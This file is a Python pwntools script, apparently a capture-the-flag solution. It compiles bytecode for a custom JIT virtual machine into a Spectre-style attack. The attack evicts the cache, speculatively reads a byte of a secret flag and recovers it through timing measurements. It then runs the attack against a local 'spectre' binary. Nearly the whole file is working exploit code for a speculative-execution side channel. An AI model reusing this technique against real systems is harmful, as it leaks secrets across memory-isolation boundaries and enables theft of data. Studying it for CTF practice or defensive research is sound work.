from pwn import *
import requests

from binascii import unhexlify
import string
import sys
import os

INTERACTIVE = False
RUN_LOCAL = True


SRC = {}
SRC['r8'] = 0 << 3
SRC['r9'] = 1 << 3
SRC['r10'] = 2 << 3
SRC['r11'] = 3 << 3
SRC['r12'] = 4 << 3
SRC['r13'] = 5 << 3
SRC['r14'] = 6 << 3
SRC['r15'] = 7 << 3

DST = {}
DST['r8'] = 0
DST['r9'] = 1
DST['r10'] = 2
DST['r11'] = 3
DST['r12'] = 4
DST['r13'] = 5
DST['r14'] = 6
DST['r15'] = 7


context.os = 'linux'
context.arch = 'amd64'


payload = ""
native = ""
offset_map = {}
pc = 0


def flush(write=False):
    global payload, native, offset_map, pc

    print disasm(native)

    payload += "\x00" * (0x1000 - 8 - len(payload))
    assert len(payload) + 8 == 0x1000

    if write:
        global written
        written = p64(len(payload)) + payload + "\n"
        with open("bytecode", "wb") as f:
            f.write(written)

    payload = ""
    native = ""
    offset_map = {}
    pc = 0


def add_instruction(vm_code, asm_code):
    global payload, native, offset_map, pc

    payload += vm_code
    native += asm_code
    pc += len(vm_code)
    offset_map[pc] = len(native)

    if INTERACTIVE:
        flush(False)


def cdq(srcdst):
    gadget = "\x4d\x63"+chr(0xc0 | (srcdst & 7) * 8 | (srcdst >> 3) & 7)

    ac = "\x01" + chr(srcdst)
    add_instruction(ac, gadget)


def add(srcdst):
    gadget = "\x4d\x01"+chr(0xc0 | srcdst)

    ac = "\x02" + chr(srcdst)
    add_instruction(ac, gadget)


def sub(srcdst):
    gadget = "\x4d\x29"+chr(0xc0 | srcdst)

    ac = "\x03" + chr(srcdst)
    add_instruction(ac, gadget)


def andd(srcdst):
    gadget = "\x4d\x21"+chr(0xc0 | srcdst)

    ac = "\x04" + chr(srcdst)
    add_instruction(ac, gadget)


def shl(srcdst):
    gadget = "\x44\x88"+chr(0xc1 | srcdst & 0x38) + "\x49\xd3" + chr(srcdst & 7 | 0xe0)

    ac = "\x05" + chr(srcdst)
    add_instruction(ac, gadget)


def shr(srcdst):
    gadget = "\x44\x88"+chr(0xc1 | srcdst & 0x38) + "\x49\xd3" + chr(srcdst & 7 | 0xe8)

    ac = "\x06" + chr(srcdst)
    add_instruction(ac, gadget)


def mov(srcdst):
    gadget = "\x4d\x89"+chr(0xc0 | srcdst)

    ac = "\x07" + chr(srcdst)
    add_instruction(ac, gadget)


def movc(dst, c):
    if c < 0:
        c += 0x100000000
    rr = dst & 7
    if rr > 0xf:
        rr -= 0x10
        gadget = "\x48\xc7" + chr(rr | 0xc0) + p32(c)
    else:
        gadget = "\x49\xc7" + chr(rr | 0xc0) + p32(c)

    ac = "\x08" + chr(dst) + p32(c)
    add_instruction(ac, gadget)


def load(srcdst):
    rr = (srcdst >> 3) & 7
    if rr > 8:
        sys.exit("load reg error")
    gadget = "\x44\x89" + chr((rr * 8) | 0xc0)
    gadget += "\x4c\x8b" + chr(8 * (srcdst & 7) + 4) + "\x07"

    ac = "\x09" + chr(srcdst)
    add_instruction(ac, gadget)


def store(srcdst):
    rr = srcdst & 7
    if rr > 8:
        sys.exit("store reg error")
    gadget = "\x44\x89" + chr((rr * 8) | 0xc0)
    gadget += "\x4c\x89" + chr(srcdst & 0x38 | 4) + "\x07"

    ac = "\x0a" + chr(srcdst)
    add_instruction(ac, gadget)


# src = r8 (bc) or r9 (time)
def builtin(srcdst):
    rr = ((srcdst >> 3) & 7)
    if rr > 1:
        sys.exit("builtin reg error")
    gadget = "\x57\x56"
    for i in xrange(4):
        gadget += "\x41" + chr(i | 0x50)
    gadget += unhexlify("8944CE8944C78944")[::-1]
    gadget += unhexlify("D98944D2")[::-1]
    gadget += "\xff\x55"
    gadget += chr(rr*8)
    for i in xrange(3, -1, -1):
        gadget += "\x41" + chr(i | 0x58)
    gadget += unhexlify("89495f5e")[::-1]
    gadget += chr(srcdst & 7 | 0xc0)

    ac = "\x0b" + chr(srcdst)
    add_instruction(ac, gadget)


def loop(src, cnt, code):
    rr = ((src >> 3) & 7)

    if cnt < 0:
        cnt += 0x100000000

    gadget = "\x48\xc7" + chr(0xc0) + p32(cnt)
    gadget += "\x49\x39" + chr(rr | 0xc0)
    gadget += "\x0f\x8e"
    gadget += p32(0x100000000 - (len(native) + 16 - offset_map[code]))

    ac = "\x0c" + chr(src) + p32(cnt) + p32(code)
    add_instruction(ac, gadget)


#################
# payload start #
#################
SHIFT = 12
flush_size = 0x40

INDEX = 0

if True:
    # for (r10 = 0; r10 <= 0x100000; r10 += 4)
    movc(DST['r10'], 0)
    initialize_loop = pc

    # data[r10] = 0
    movc(DST['r8'], 0)
    store(DST['r10'] | SRC['r8'])

    movc(DST['r8'], 4)
    add(DST['r10'] | SRC['r8'])
    loop(SRC['r10'], 0x100000, initialize_loop)

if True:
    # evict cache
    # for (r13 = 0; r13 <= 0x10; r13++)
    movc(DST['r13'], 0)
    out_loop = pc

    if True:
        # for (r10 = 0; r10 < 0x1f00000; r10 += flush_size)
        movc(DST['r10'], 0)
        in_loop = pc

        # r12 = 0x1fffff0 - r10
        movc(DST['r12'], 0x1fffff0)
        sub(DST['r12'] | SRC['r10'])

        # r8 = data[r12]
        load(DST['r8'] | SRC['r12'])

        movc(DST['r8'], flush_size)
        add(DST['r10'] | SRC['r8'])

        loop(SRC['r10'], 0x1f00000 - 1, in_loop)

    movc(DST['r8'], 1)
    add(DST['r13'] | SRC['r8'])
    loop(SRC['r13'], 0x10, out_loop)

# trigger Spectre
movc(DST['r11'], 56)
movc(DST['r12'], 56 - SHIFT)

# r14 = b1(0x1018 + INDEX)
movc(DST['r8'], 0x1018 + INDEX)
builtin(SRC['r8'] | DST['r14'])

# r8 = data[(r14 << 56) >> (56 - SHIFT))]
shl(DST['r14'] | SRC['r11'])
shr(DST['r14'] | SRC['r12'])
load(DST['r8'] | SRC['r14'])


if True:
    # for (r10 = 0xff000; r10 > 0; r10 -= (1 << SHIFT))
    movc(DST['r11'], 1)
    movc(DST['r10'], 0xff000)
    check_loop = pc

    # r9 = b2()
    builtin(SRC['r9'] | DST['r9'])

    # r8 = data[r10]
    load(DST['r8'] | SRC['r10'])

    # r8 = b2() - r9
    builtin(SRC['r9'] | DST['r8'])
    sub(DST['r8'] | SRC['r9'])

    # r11 <<= 3
    movc(DST['r9'], 3)
    shl(DST['r11'] | SRC['r9'])

    movc(DST['r12'], 0x800)
    sub(DST['r12'] | SRC['r11'])
    load(DST['r9'] | SRC['r12'])
    add(DST['r8'] | SRC['r9'])
    store(DST['r12'] | SRC['r8'])

    # r11 >>= 3
    movc(DST['r9'], 3)
    shr(DST['r11'] | SRC['r9'])

    movc(DST['r8'], 1 << SHIFT)
    sub(DST['r10'] | SRC['r8'])

    movc(DST['r8'], 1)
    add(DST['r11'] | SRC['r8'])

    loop(SRC['r11'], 0x100, check_loop)

movc(DST['r8'], 1)
add(DST['r15'] | SRC['r8'])
###############
# payload end #
###############

flush(write=True)

if RUN_LOCAL:
    p = process(['./spectre', 'flag'])
    # gdb.attach(p)
    p.send(written)

    data = p.recvall()
    print hexdump(data)

    result = []
    for c in string.printable:
        i = ord(c)
        result.append((u64(data[8 * i:8 * (i + 1)]), c))
    result.sort()
    print result[0]

INTERACTIVE = True
